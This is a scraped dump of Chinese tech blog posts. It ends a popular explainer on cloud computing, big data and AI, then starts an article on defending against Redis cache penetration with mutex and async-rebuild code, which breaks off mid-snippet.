资源层面的灵活性,\n,随着OpenStack的技术越来越成熟，可以管理的规模也越来越大，并且可以有多个OpenStack集群部署多套，比如北京部署一套，杭州部署两套，广州部署一套，然后进行统一的管理。这样整个规模就更大了。在这个规模下，对于普通用户的感知来讲，基本能够做到想什么时候要就什么什么药，想要多少就要多少。还是拿云盘举例子，每个用户云盘都分配了5T甚至更大的空间，如果有1亿人，那加起来空间多大啊。其实背后的机制是这样的，分配你的空间，你可能只用了其中很少一点，比如说它分配给你了5个T，这么大的空间仅仅是你看到的，而不是真的就给你了，你其实只用了50个G，则真实给你的就是50个G，随着你文件的不断上传，分给你的空间会越来越多。当大家都上传，云平台发现快满了的时候(例如用了70%)，会采购更多的服务器，扩充背后的资源，这个对用户是透明的，看不到的，从感觉上来讲，就实现了云计算的弹性。其实有点像银行，给储户的感觉是什么时候取钱都有，只要不同时挤兑，银行就不会垮。,\n,这里做一个简单的总结，到了这个阶段，云计算基本上实现了时间灵活性和空间灵活性，实现了计算，网络，存储资源的弹性。计算，网络，存储我们常称为基础设施Infranstracture, 因而这个阶段的弹性称为资源层面的弹性，管理资源的云平台，我们称为基础设施服务，就是我们常听到的IaaS，Infranstracture As A Service。,\n,二、云计算不光管资源，也要管应用,\n,\n,有了IaaS，实现了资源层面的弹性就够了吗？显然不是。还有应用层面的弹性。这里举个例子，比如说实现一个电商的应用，平时十台机器就够了，双十一需要一百台。你可能觉得很好办啊，有了IaaS，新创建九十台机器就可以了啊。但是90台机器创建出来是空的啊，电商应用并没有放上去啊，只能你公司的运维人员一台一台的弄，还是需要很长时间才能安装好的。虽然资源层面实现了弹性，但是没有应用层的弹性，依然灵活性是不够的。,\n,有没有方法解决这个问题呢？于是人们在IaaS平台之上又加了一层，用于管理资源以上的应用弹性的问题，这一层通常称为PaaS（Platform As A Service）。这一层往往比较难理解，其实大致分两部分，一部分我称为你自己的应用自动安装，一部分我称为通用的应用不用安装。,\n,我们先来说第一部分，自己的应用自动安装。比如电商应用是你自己开发的，除了你自己，其他人是不知道怎么安装的，比如电商应用，安装的时候需要配置支付宝或者微信的账号，才能别人在你的电商上买东西的时候，付的钱是打到你的账户里面的，除了你，谁也不知道，所以安装的过程平台帮不了忙，但是能够帮你做的自动化，你需要做一些工作，将自己的配置信息融入到自动化的安装过程中方可。比如上面的例子，双十一新创建出来的90台机器是空的，如果能够提供一个工具，能够自动在这新的90台机器上将电商应用安装好，就能够实现应用层面的真正弹性。例如Puppet, Chef, Ansible, Cloud Foundary都可以干这件事情，最新的容器技术Docker能更好的干这件事情，不做技术的可以不用管这些词。,\n,第二部分，通用的应用不用安装。所谓通用的应用，一般指一些复杂性比较高，但是大家都在用的，例如数据库。几乎所有的应用都会用数据库，但是数据库软件是标准的，虽然安装和维护比较复杂，但是无论谁安装都是一样。这样的应用可以变成标准的PaaS层的应用放在云平台的界面上。当用户需要一个数据库的时候，一点就出来了，用户就可以直接用了。有人问，既然谁安装都一个样，那我自己来好了，不需要花钱在云平台上买。当然不是，数据库是一个非常难的东西，光Oracle这家公司，靠数据库就能赚这么多钱。买Oracle也是要花很多很多钱的。然而大多数云平台会提供Mysql这样的开源数据库，又是开源，钱不需要花这么多了，但是维护这个数据库，却需要专门招一个很大的团队，如果这个数据库能够优化到能够支撑双十一，也不是一年两年能够搞定的。比如您是一个做单车的，当然没必要招一个非常大的数据库团队来干这件事情，成本太高了，应该交给云平台来做这件事情，专业的事情专业的人来自，云平台专门养了几百人维护这套系统，您只要专注于您的单车应用就可以了。,\n,要么是自动部署，要么是不用部署，总的来说就是应用层你也要少操心，这就是PaaS层的重要作用。,\n,\n,虽说脚本的方式能够解决自己的应用的部署问题，然而不同的环境千差万别，一个脚本往往在一个环境上运行正确，到另一个环境就不正确了。,\n,而容器是能更好的解决这个问题的。,\n,\n,容器是 Container，Container另一个意思是集装箱，其实容器的思想就是要变成软件交付的集装箱。集装箱的特点，一是封装，二是标准。,\n,\n,在没有集装箱的时代，假设将货物从 A运到 B，中间要经过三个码头、换三次船。每次都要将货物卸下船来，摆的七零八落，然后搬上船重新整齐摆好。因此在没有集装箱的时候，每次换船，船员们都要在岸上待几天才能走。,\n,\n,有了集装箱以后，所有的货物都打包在一起了，并且集装箱的尺寸全部一致，所以每次换船的时候，一个箱子整体搬过去就行了，小时级别就能完成，船员再也不用上岸长时间耽搁了。,\n,这是集装箱“封装”、“标准”两大特点在生活中的应用。,\n,\n,那么容器如何对应用打包呢？还是要学习集装箱，首先要有个封闭的环境，将货物封装起来，让货物之间互不干扰，互相隔离，这样装货卸货才方便。好在 Ubuntu中的LXC技术早就能做到这一点。,\n,封闭的环境主要使用了两种技术，一种是看起来是隔离的技术，称为 Namespace，也即每个 Namespace中的应用看到的是不同的 IP地址、用户空间、程号等。另一种是用起来是隔离的技术，称为 Cgroups，也即明明整台机器有很多的 CPU、内存，而一个应用只能用其中的一部分。,\n,所谓的镜像，就是将你焊好集装箱的那一刻，将集装箱的状态保存下来，就像孙悟空说：“定”，集装箱里面就定在了那一刻，然后将这一刻的状态保存成一系列文件。这些文件的格式是标准的，谁看到这些文件都能还原当时定住的那个时刻。将镜像还原成运行时的过程（就是读取镜像文件，还原那个时刻的过程）就是容器运行的过程。,\n,有了容器，使得 PaaS层对于用户自身应用的自动部署变得快速而优雅。,\n,三、大数据拥抱云计算,\n,在PaaS层中一个复杂的通用应用就是大数据平台。大数据是如何一步一步融入云计算的呢？,\n,3.1 数据不大也包含智慧,\n,一开始这个大数据并不大，你想象原来才有多少数据？现在大家都去看电子书，上网看新闻了，在我们80后小时候，信息量没有那么大，也就看看书，看看报，一个星期的报纸加起来才有多少字啊，如果你不在一个大城市，一个普通的学校的图书馆加起来也没几个书架，是后来随着信息化的到来，信息才会越来越多。,\n,首先我们来看一下大数据里面的数据，就分三种类型，一种叫结构化的数据，一种叫非结构化的数据，还有一种叫半结构化的数据。什么叫结构化的数据呢？叫有固定格式和有限长度的数据。例如填的表格就是结构化的数据，国籍：中华人民共和国，民族：汉，性别：男，这都叫结构化数据。现在越来越多的就是非结构化的数据，就是不定长，无固定格式的数据，例如网页，有时候非常长，有时候几句话就没了，例如语音，视频都是非结构化的数据。半结构化数据是一些xml或者html的格式的，不从事技术的可能不了解，但也没有关系。,\n,数据怎么样才能对人有用呢？其实数据本身不是有用的，必须要经过一定的处理。例如你每天跑步带个手环收集的也是数据，网上这么多网页也是数据，我们称为Data，数据本身没有什么用处，但是数据里面包含一个很重要的东西，叫做信息Information，数据十分杂乱，经过梳理和清洗，才能够称为信息。信息会包含很多规律，我们需要从信息中将规律总结出来，称为知识knowledge，知识改变命运。信息是很多的，但是有人看到了信息相当于白看，但是有人就从信息中看到了电商的未来，有人看到了直播的未来，所以人家就牛了，你如果没有从信息中提取出知识，天天看朋友圈，也只能在互联网滚滚大潮中做个看客。有了知识，然后利用这些知识去应用于实战，有的人会做得非常好，这个东西叫做智慧intelligence。有知识并不一定有智慧，例如好多学者很有知识，已经发生的事情可以从各个角度分析的头头是道，但一到实干就歇菜，并不能转化成为智慧。而很多的创业家之所以伟大，就是通过获得的知识应用于实践，最后做了很大的生意。,\n,所以数据的应用分这四个步骤：数据，信息，知识，智慧。这是很多商家都想要的，你看我收集了这么多的数据，能不能基于这些数据来帮我做下一步的决策，改善我的产品，例如让用户看视频的时候旁边弹出广告，正好是他想买的东西，再如让用户听音乐的时候，另外推荐一些他非常想听的其他音乐。用户在我的应用或者网站上随便点点鼠标，输入文字对我来说都是数据，我就是要将其中某些东西提取出来，指导实践，形成智慧，让用户陷入到我的应用里面不可自拔，上了我的网就不想离开，手不停的点，不停的买，很多人说双十一我都想断网了，我老婆在上面不断的买买买，买了A又推荐B，老婆大人说，“哎呀，B也是我喜欢的啊，老公我要买”。你说这个程序怎么这么牛，这么有智慧，比我还了解我老婆，这件事情是怎么做到的呢？,\n,\n,3.2 数据如何升华为智慧,\n,数据的处理分几个步骤，完成了才最后会有智慧。,\n,第一个步骤叫数据的收集。首先得有数据，数据的收集有两个方式，第一个方式是拿，专业点的说法叫抓取或者爬取，例如搜索引擎就是这么做的，它把网上的所有的信息都下载到它的数据中心，然后你一搜才能搜出来。比如你去搜索的时候，结果会是一个列表，这个列表为什么会在搜索引擎的公司里面呢，就是因为他把这个数据啊都拿下来了，但是你一点链接，点出来这个网站就不在搜索引擎它们公司了。比如说新浪有个新闻，你拿百度搜出来，你不点的时候，那一页在百度数据中心，一点出来的网页就是在新浪的数据中心了。另外一个方式就是推送，有很多终端可以帮我收集数据，比如说小米手环，可以将你每天跑步的数据，心跳的数据，睡眠的数据都上传到数据中心里面。,\n,第二个步骤是数据的传输。一般会通过队列方式进行，因为数据量实在是太大了，数据必须经过处理才会有用，可是系统处理不过来，只好排好队，慢慢的处理。,\n,第三个步骤是数据的存储。现在数据就是金钱，掌握了数据就相当于掌握了钱。要不然网站怎么知道你想买什么呢？就是因为它有你历史的交易的数据，这个信息可不能给别人，十分宝贵，所以需要存储下来。,\n,第四个步骤是数据的处理和分析。上面存储的数据是原始数据，原始数据多是杂乱无章的，有很多垃圾数据在里面，因而需要清洗和过滤，得到一些高质量的数据。对于高质量的数据，就可以进行分析，从而对数据进行分类，或者发现数据之间的相互关系，得到知识。比如盛传的沃尔玛超市的啤酒和尿布的故事，就是通过对人们的购买数据进行分析，发现了男人一般买尿布的时候，会同时购买啤酒，这样就发现了啤酒和尿布之间的相互关系，获得知识，然后应用到实践中，将啤酒和尿布的柜台弄的很近，就获得了智慧。,\n,第五个步骤就是对于数据的检索和挖掘。检索就是搜索，所谓外事不决问google，内事不决问百度。内外两大搜索引擎都是讲分析后的数据放入搜索引擎，从而人们想寻找信息的时候，一搜就有了。另外就是挖掘，仅仅搜索出来已经不能满足人们的要求了，还需要从信息中挖掘出相互的关系。比如财经搜索，当搜索某个公司股票的时候，该公司的高管是不是也应该被挖掘出来呢？如果仅仅搜索出这个公司的股票发现涨的特别好，于是你就去买了，其实其高管发了一个声明，对股票十分不利，第二天就跌了，这不坑害广大股民么？所以通过各种算法挖掘数据中的关系，形成知识库，十分重要。,\n,\n,\n,3.3 大数据时代，众人拾柴火焰高,\n,当数据量很小的时候，很少的几台机器就能解决。慢慢的当数据量越来越大，最牛的服务器都解决不了问题的时候，就想怎么办呢？要聚合多台机器的力量，大家齐心协力一起把这个事搞定，众人拾柴火焰高。,\n,对于数据的收集，对于IoT来讲，外面部署这成千上万的检测设备，将大量的温度，适度，监控，电力等等数据统统收集上来，对于互联网网页的搜索引擎来讲，需要将整个互联网所有的网页都下载下来，这显然一台机器做不到，需要多台机器组成网络爬虫系统，每台机器下载一部分，同时工作，才能在有限的时间内，将海量的网页下载完毕。,\n,\n,对于数据的传输，一个内存里面的队列肯定会被大量的数据挤爆掉，于是就产生了基于硬盘的分布式队列，这样队列可以多台机器同时传输，随你数据量多大，只要我的队列足够多，管道足够粗，就能够撑得住。,\n,\n,对于数据的存储，一台机器的文件系统肯定是放不下了，所以需要一个很大的分布式文件系统来做这件事情，把多台机器的硬盘打成一块大的文件系统。,\n,\n,再如数据的分析，可能需要对大量的数据做分解，统计，汇总，一台机器肯定搞不定，处理到猴年马月也分析不完，于是就有分布式计算的方法，将大量的数据分成小份，每台机器处理一小份，多台机器并行处理，很快就能算完。例如著名的Terasort对1个TB的数据排序，相当于1000G，如果单机处理，怎么也要几个小时，但是并行处理209秒就完成了。,\n,\n,\n,\n,所以说大数据平台，什么叫做大数据，说白了就是一台机器干不完，大家一起干。随着数据量越来越大，很多不大的公司都需要处理相当多的数据，这些小公司没有这么多机器可怎么办呢？,\n,3.4 大数据需要云计算，云计算需要大数据,\n,说到这里，大家想起云计算了吧。当想要干这些活的时候，需要好多好多的机器一块做，真的是想什么时候要，想要多少就要多少。例如大数据分析公司的财务情况，可能一周分析一次，如果要把这一百台机器或者一千台机器都在那放着，一周用一次对吧，非常浪费。那能不能需要计算的时候，把这一千台机器拿出来，然后不算的时候，这一千台机器可以去干别的事情。谁能做这个事儿呢？只有云计算，可以为大数据的运算提供资源层的灵活性。而云计算也会部署大数据放到它的PaaS平台上，作为一个非常非常重要的通用应用。因为大数据平台能够使得多台机器一起干一个事儿，这个东西不是一般人能开发出来的，也不是一般人玩得转的，怎么也得雇个几十上百号人才能把这个玩起来，所以说就像数据库一样，其实还是需要有一帮专业的人来玩这个东西。现在公有云上基本上都会有大数据的解决方案了，一个小公司我需要大数据平台的时候，不需要采购一千台机器，只要到公有云上一点，这一千台机器都出来了，并且上面已经部署好了的大数据平台，只要把数据放进去算就可以了。,\n,云计算需要大数据，大数据需要云计算，两个人就这样结合了。,\n,四、人工智能拥抱大数据,\n,4.1 机器什么时候才能懂人心,\n,虽说有了大数据，人的欲望总是这个不能够满足。虽说在大数据平台里面有搜索引擎这个东西，想要什么东西我一搜就出来了。但是也存在这样的情况，我想要的东西不会搜，表达不出来，搜索出来的又不是我想要的。例如音乐软件里面推荐一首歌，这首歌我没听过，当然不知道名字，也没法搜，但是软件推荐给我，我的确喜欢，这就是搜索做不到的事情。当人们使用这种应用的时候，会发现机器知道我想要什么，而不是说当我想要的时候，去机器里面搜索。这个机器真像我的朋友一样懂我，这就有点人工智能的意思了。,\n,人们很早就在想这个事情了。最早的时候，人们想象，如果要是有一堵墙，墙后面是个机器，我给它说话，它就给我回应，我如果感觉不出它那边是人还是机器，那它就真的是一个人工智能的东西了。,\n,4.2 让机器学会推理,\n,怎么才能做到这一点呢？人们就想：我首先要告诉计算机人类的推理的能力。你看人重要的是什么呀，人和动物的区别在什么呀，就是能推理。我要是把我这个推理的能力啊告诉机器，机器就能根据你的提问，推理出相应的回答，真能这样多好。推理其实人们慢慢的让机器能够做到一些了，例如证明数学公式。这是一个非常让人惊喜的一个过程，机器竟然能够证明数学公式。但是慢慢发现其实这个结果，也没有那么令人惊喜，因为大家发现了一个问题，数学公式非常严谨，推理过程也非常严谨，而且数学公式很容易拿机器来进行表达，程序也相对容易表达。然而人类的语言就没这么简单了，比如今天晚上，你和你女朋友约会，你女朋友说：如果你早来，我没来，你等着，如果我早来，你没来，你等着。这个机器就比比较难理解了，但是人都懂，所以你和女朋友约会，你是不敢迟到的。,\n,4.3 教给机器知识,\n,所以仅仅告诉机器严格的推理是不够的，还要告诉机器一些知识。但是知识这个事儿，一般人可能就做不来了，可能专家可以，比如语言领域的专家，或者财经领域的专家。语言领域和财经领域知识能不能表示成像数学公式一样稍微严格点呢？例如语言专家可能会总结出主谓宾定状补这些语法规则，主语后面一定是谓语，谓语后面一定是宾语，将这些总结出来，并严格表达出来不久行了吗？后来发现这个不行，太难总结了，语言表达千变万化。就拿主谓宾的例子，很多时候在口语里面就省略了谓语，别人问：你谁啊？我回答：我刘超。但是你不能规定在语音语义识别的时候，要求对着机器说标准的书面语，这样还是不够智能，就像罗永浩在一次演讲中说的那样，每次对着手机，用书面语说：请帮我呼叫某某某，这是一件很尴尬的事情。,\n,人工智能这个阶段叫做专家系统。专家系统不易成功，一方面是知识比较难总结，另一方面总结出来的知识难以教给计算机。因为你自己还迷迷糊糊，似乎觉得有规律，就是说不出来，就怎么能够通过编程教给计算机呢？,\n,4.4 算了，教不会你自己学吧,\n,于是人们想到，看来机器是和人完全不一样的物种，干脆让机器自己学习好了。机器怎么学习呢？既然机器的统计能力这么强，基于统计学习，一定能从大量的数字中发现一定的规律。,\n,其实在娱乐圈有很好的一个例子，可见一斑,\n,有一位网友统计了知名歌手在大陆发行的 9 张专辑中 117 首歌曲的歌词，同一词语在一首歌出现只算一次，形容词、名词和动词的前十名如下表所示（词语后面的数字是出现的次数）：,\n,\n,\n,\n,\n,\n,\n,\n,\n,\n,\n,a,\n,形容词,\n,b,\n,名词,\n,c,\n,动词,\n,\n,\n,0,\n,孤独:34,\n,0,\n,生命:50,\n,0,\n,爱:54,\n,\n,\n,1,\n,自由:17,\n,1,\n,路:37,\n,1,\n,碎:37,\n,\n,\n,2,\n,迷惘:16,\n,2,\n,夜:29,\n,2,\n,哭:35,\n,\n,\n,3,\n,坚强:13,\n,3,\n,天空:24,\n,3,\n,死:27,\n,\n,\n,4,\n,绝望:8,\n,4,\n,孩子:23,\n,4,\n,飞:26,\n,\n,\n,5,\n,青春:7,\n,5,\n,雨:21,\n,5,\n,梦想:14,\n,\n,\n,6,\n,迷茫:6,\n,6,\n,石头:9,\n,6,\n,祈祷:10,\n,\n,\n,7,\n,光明:6,\n,7,\n,鸟:9,\n,7,\n,离去:10,\n,\n,\n,\n,如果我们随便写一串数字，然后按照数位依次在形容词、名词和动词中取出一个词，连在一起会怎么样呢？,\n,例如取圆周率 3.1415926，对应的词语是：坚强，路，飞，自由，雨，埋，迷惘。稍微连接和润色一下：,\n,坚强的孩子，,\n,依然前行在路上，,\n,张开翅膀飞向自由，,\n,让雨水埋葬他的迷惘。,\n,是不是有点感觉了？当然真正基于统计的学习算法比这个简单的统计复杂的多。,\n,然而统计学习比较容易理解简单的相关性，例如一个词和另一个词总是一起出现，两个词应该有关系，而无法表达复杂的相关性，并且统计方法的公式往往非常复杂，为了简化计算，常常做出各种独立性的假设，来降低公式的计算难度，然而现实生活中，具有独立性的事件是相对较少的。,\n,4.5 模拟大脑的工作方式,\n,于是人类开始从机器的世界，反思人类的世界是怎么工作的。,\n,\n,人类的脑子里面不是存储着大量的规则，也不是记录着大量的统计数据，而是通过神经元的触发实现的，每个神经元有从其他神经元的输入，当接收到输入的时候，会产生一个输出来刺激其他的神经元，于是大量的神经元相互反应，最终形成各种输出的结果。例如当人们看到美女瞳孔放大，绝不是大脑根据身材比例进行规则判断，也不是将人生中看过的所有的美女都统计一遍，而是神经元从视网膜触发到大脑再回到瞳孔。在这个过程中，其实很难总结出每个神经元对最终的结果起到了哪些作用，反正就是起作用了。,\n,于是人们开始用一个数学单元模拟神经元,\n,这个神经元有输入，有输出，输入和输出之间通过一个公式来表示，输入根据重要程度不同(权重)，影响着输出。,\n,\n,于是将n个神经元通过像一张神经网络一样连接在一起，n这个数字可以很大很大，所有的神经元可以分成很多列，每一列很多个排列起来，每个神经元的对于输入的权重可以都不相同，从而每个神经元的公式也不相同。当人们从这张网络中输入一个东西的时候，希望输出一个对人类来讲正确的结果。例如上面的例子，输入一个写着2的图片，输出的列表里面第二个数字最大，其实从机器来讲，它既不知道输入的这个图片写的是2，也不知道输出的这一系列数字的意义，没关系，人知道意义就可以了。正如对于神经元来说，他们既不知道视网膜看到的是美女，也不知道瞳孔放大是为了看的清楚，反正看到美女，瞳孔放大了，就可以了。,\n,对于任何一张神经网络，谁也不敢保证输入是2，输出一定是第二个数字最大，要保证这个结果，需要训练和学习。毕竟看到美女而瞳孔放大也是人类很多年进化的结果。学习的过程就是，输入大量的图片，如果结果不是想要的结果，则进行调整。如何调整呢，就是每个神经元的每个权重都向目标进行微调，由于神经元和权重实在是太多了，所以整张网络产生的结果很难表现出非此即彼的结果，而是向着结果微微的进步，最终能够达到目标结果。当然这些调整的策略还是非常有技巧的，需要算法的高手来仔细的调整。正如人类见到美女，瞳孔一开始没有放大到能看清楚，于是美女跟别人跑了，下次学习的结果是瞳孔放大一点点，而不是放大鼻孔。,\n,4.6 没道理但做得到,\n,听起来也没有那么有道理，但是的确能做到，就是这么任性。,\n,神经网络的普遍性定理是这样说的，假设某个人给你某种复杂奇特的函数，f(x)：,\n,\n,不管这个函数是什么样的，总会确保有个神经网络能够对任何可能的输入x，其值f(x)（或者某个能够准确的近似）是神经网络的输出。,\n,如果在函数代表着规律，也意味着这个规律无论多么奇妙，多么不能理解，都是能通过大量的神经元，通过大量权重的调整，表示出来的。,\n,4.7 人工智能的经济学解释,\n,这让我想到了经济学，于是比较容易理解了。,\n,\n,我们把每个神经元当成社会中从事经济活动的个体。于是神经网络相当于整个经济社会，每个神经元对于社会的输入，都有权重的调整，做出相应的输出，比如工资涨了，菜价也涨了，股票跌了，我应该怎么办，怎么花自己的钱。这里面没有规律么？肯定有，但是具体什么规律呢？却很难说清楚。,\n,基于专家系统的经济属于计划经济，整个经济规律的表示不希望通过每个经济个体的独立决策表现出来，而是希望通过专家的高屋建瓴和远见卓识总结出来。专家永远不可能知道哪个城市的哪个街道缺少一个卖甜豆腐脑的。于是专家说应该产多少钢铁，产多少馒头，往往距离人民生活的真正需求有较大的差距，就算整个计划书写个几百页，也无法表达隐藏在人民生活中的小规律。,\n,基于统计的宏观调控就靠谱的多了，每年统计局都会统计整个社会的就业率，通胀率，GDP等等指标，这些指标往往代表着很多的内在规律，虽然不能够精确表达，但是相对靠谱。然而基于统计的规律总结表达相对比较粗糙，比如经济学家看到这些统计数据可以总结出长期来看房价是涨还是跌，股票长期来看是涨还是跌，如果经济总体上扬，房价和股票应该都是涨的。但是基于统计数据，无法总结出股票，物价的微小波动规律。,\n,基于神经网络的微观经济学才是对整个经济规律最最准确的表达，每个人对于从社会中的输入，进行各自的调整，并且调整同样会作为输入反馈到社会中。想象一下股市行情细微的波动曲线，正是每个独立的个体各自不断交易的结果，没有统一的规律可循。而每个人根据整个社会的输入进行独立决策，当某些因素经过多次训练，也会形成宏观上的统计性的规律，这也就是宏观经济学所能看到的。例如每次货币大量发行，最后房价都会上涨，多次训练后，人们也就都学会了。,\n,4.8 人工智能需要大数据,\n,然而神经网络包含这么多的节点，每个节点包含非常多的参数，整个参数量实在是太大了，需要的计算量实在太大，但是没有关系啊，我们有大数据平台，可以汇聚多台机器的力量一起来计算，才能在有限的时间内得到想要的结果。,\n,人工智能可以做的事情非常多，例如可以鉴别垃圾邮件，鉴别黄色暴力文字和图片等。这也是经历了三个阶段的。第一个阶段依赖于关键词黑白名单和过滤技术，包含哪些词就是黄色或者暴力的文字。随着这个网络语言越来越多，词也不断的变化，不断的更新这个词库就有点顾不过来。第二个阶段时，基于一些新的算法，比如说贝叶斯过滤等，你不用管贝叶斯算法是什么，但是这个名字你应该听过，这个一个基于概率的算法。第三个阶段就是基于大数据和人工智能，进行更加精准的用户画像和文本理解和图像理解。,\n,由于人工智能算法多是依赖于大量的数据的，这些数据往往需要面向某个特定的领域(例如电商，邮箱)进行长期的积累，如果没有数据，就算有人工智能算法也白搭，所以人工智能程序很少像前面的IaaS和PaaS一样，将人工智能程序给某个客户安装一套让客户去用，因为给某个客户单独安装一套，客户没有相关的数据做训练，结果往往是很差的。但是云计算厂商往往是积累了大量数据的，于是就在云计算厂商里面安装一套，暴露一个服务接口，比如您想鉴别一个文本是不是涉及黄色和暴力，直接用这个在线服务就可以了。这种形势的服务，在云计算里面称为软件即服务，SaaS (Software AS A Service),\n,于是工智能程序作为SaaS平台进入了云计算。,\n,五、云计算，大数据，人工智能过上了美好的生活,\n,终于云计算的三兄弟凑齐了，分别是IaaS，PaaS和SaaS，所以一般在一个云计算平台上，云，大数据，人工智能都能找得到。对一个大数据公司，积累了大量的数据，也会使用一些人工智能的算法提供一些服务。对于一个人工智能公司，也不可能没有大数据平台支撑。所以云计算，大数据，人工智能就这样整合起来，完成了相遇，相识，相知。,\n,本文作者刘超，《Lucene应用开发揭秘》。个人公众号：刘超的通俗云计算(popsuper1982)。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,4, 赞,\n        , 11 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114005/", "url_object_id": "4e10d4da22dcb529fe4ac299ec0ce8f8", "front_image_path": "full/57fc0c444fd0ac52984787357e439ebad08d7b14.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/03/4bae6998d00f180d42c7da716e3d0bb2.jpg"], "title": "分布式之缓存击穿", "create_time": "2018/05/19", "vote": "2", "bookmark": "5", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,孤独烟,   ,什么是缓存击穿,\n,在谈论缓存击穿之前，我们先来回忆下从缓存中加载数据的逻辑，如下图所示,\n,\n,因此，如果黑客每次故意查询一个在缓存内必然不存在的数据，导致每次请求都要去存储层去查询，这样缓存就失去了意义。如果在大流量下数据库可能挂掉。这就是缓存击穿。,\n场景如下图所示:,\n,\n,我们正常人在登录首页的时候，都是根据userID来命中数据，然而黑客的目的是破坏你的系统，黑客可以随机生成一堆userID,然后将这些请求怼到你的服务器上，这些请求在缓存中不存在，就会穿过缓存，直接怼到数据库上,从而造成数据库连接异常。,\n,解决方案,\n,在这里我们给出三套解决方案，大家根据项目中的实际情况，选择使用.,\n,讲下述三种方案前，我们先回忆下redis的setnx方法,\n,SETNX, ,key, ,value,\n,将 key 的值设为 value ，当且仅当 key 不存在。,\n,若给定的 key 已经存在，则 SETNX 不做任何动作。,\n,SETNX 是『SET if Not eXists』(如果不存在，则 SET)的简写。,\n,可用版本,：>= 1.0.0,\n,时间复杂度：, O(1),\n,返回值：, 设置成功，返回 1。设置失败，返回 0 。,\n,效果如下,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nredis> EXISTS job                # job 不存在\r\n(integer) 0\r\n\r\nredis> SETNX job \"programmer\"    # job 设置成功\r\n(integer) 1\r\n\r\nredis> SETNX job \"code-farmer\"   # 尝试覆盖 job ，失败\r\n(integer) 0\r\n\r\nredis> GET job                   # 没有被覆盖\r\n\"programmer\",\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,redis,>, ,EXISTS ,job,                ,# job 不存在,(,integer,), ,0, ,redis,>, ,SETNX ,job, ,\"programmer\",    ,# job 设置成功,(,integer,), ,1, ,redis,>, ,SETNX ,job, ,\"code-farmer\",   ,# 尝试覆盖 job ，失败,(,integer,), ,0, ,redis,>, ,GET ,job,                   ,# 没有被覆盖,\"programmer\",\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,1、使用互斥锁,\n,该方法是比较普遍的做法，即，在根据key获得的value值为空时，先锁上，再从数据库加载，加载完毕，释放锁。若其他线程发现获取锁失败，则睡眠50ms后重试。,\n,至于锁的类型，单机环境用并发包的Lock类型就行，集群环境则使用分布式锁( redis的setnx),\n,集群环境的redis的代码如下所示:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nString get(String key) {  \r\n   String value = redis.get(key);  \r\n   if (value  == null) {  \r\n    if (redis.setnx(key_mutex, \"1\")) {  \r\n        // 3 min timeout to avoid mutex holder crash  \r\n        redis.expire(key_mutex, 3 * 60)  \r\n        value = db.get(key);  \r\n        redis.set(key, value);  \r\n        redis.delete(key_mutex);  \r\n    } else {  \r\n        //其他线程休息50毫秒后重试  \r\n        Thread.sleep(50);  \r\n        get(key);  \r\n    }  \r\n  }  \r\n}  ,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,String, ,get,(,String, ,key,), ,{,  ,   ,String, ,value, ,=, ,redis,.,get,(,key,),;,  ,   ,if, ,(,value,  ,==, ,null,), ,{,  ,    ,if, ,(,redis,.,setnx,(,key_mutex,,, ,\"1\",),), ,{,  ,        ,// 3 min timeout to avoid mutex holder crash  ,        ,redis,.,expire,(,key_mutex,,, ,3, ,*, ,60,),  ,        ,value, ,=, ,db,.,get,(,key,),;,  ,        ,redis,.,set,(,key,,, ,value,),;,  ,        ,redis,.,delete,(,key_mutex,),;,  ,    ,}, ,else, ,{,  ,        ,//其他线程休息50毫秒后重试  ,        ,Thread,.,sleep,(,50,),;,  ,        ,get,(,key,),;,  ,    ,},  ,  ,},  ,},  ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,优点:,\n,\n,思路简单,\n,保证一致性,\n,\n,缺点,\n,\n,代码复杂度增大,\n,存在死锁的风险,\n,\n,2、异步构建缓存,\n,在这种方案下，构建缓存采取异步策略，会从线程池中取线程来异步构建缓存，从而不会让所有的请求直接怼到数据库上。该方案redis自己维护一个timeout，当timeout小于System.currentTimeMillis()时，则进行缓存更新，否则直接返回value值。,\n集群环境的redis代码如下所示:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nString get(final String key) {  \r\n        V v = redis.get(key);  \r\n        String value = v.getValue();  \r\n        long timeout = v.getTimeout();  \r\n        if (v.timeout <= System.currentTimeMillis()) {  \r\n            // 异步更新后台异常执行  \r\n            threadPool.execute(new Runnable() {  \r\n                public void run() {  \r\n                    String keyMutex = \"mutex:\" + key;  \r\n                    if (redis.setnx(keyMutex, \"1\")) {  \r\n                        // 3 min timeout to avoid mutex holder crash  \r\n                        redis.expire(keyMutex, 3 * 60);  \r\n                        String dbValue = db.get(key);  \r\n                        redis.set(key, dbValue);  \r\n                        redis.delete(keyMutex);  \r\n                    }  \r\n                }  \r\n            });  \r\n        }  \r\n        return value;  \r\n    },\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,String, ,get,(,final, ,String, ,key,), ,{,  ,        ,V, ,v, ,=, ,redis,.,get,(,key,),;,  ,        ,String, ,value, ,=, ,v,.,getValue,(,),;,  ,        